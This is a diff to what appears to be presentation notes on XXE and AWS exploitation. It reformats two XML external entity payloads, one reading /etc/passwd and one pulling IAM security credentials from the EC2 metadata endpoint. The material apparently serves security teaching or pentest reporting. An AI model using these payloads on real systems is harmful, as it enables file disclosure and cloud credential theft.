@@ -27,10 +27,7 @@ slide is the example payload below
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
    <!ELEMENT foo ANY >
-   <!ENTITY xxe SYSTEM "file:///etc/passwd" >
- ]>
- 
- <foo>&xxe;</foo>
+   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 ```
 
 ## AWS Metadata
@@ -43,14 +40,11 @@ slide is a recording of `curl 169.254 ...` in an EC2 box
 	* Pentest finding: ![high](./assets/vuln2.png)
 
 **Example payload:**
-```
+```xml
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
    <!ELEMENT foo ANY >
-   <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/iam-role" >
- ]>
- 
- <foo>&xxe;</foo>
+   <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/iam-role" >]><foo>&xxe;</foo>
 ```
 
 ## AWS Account Compromise
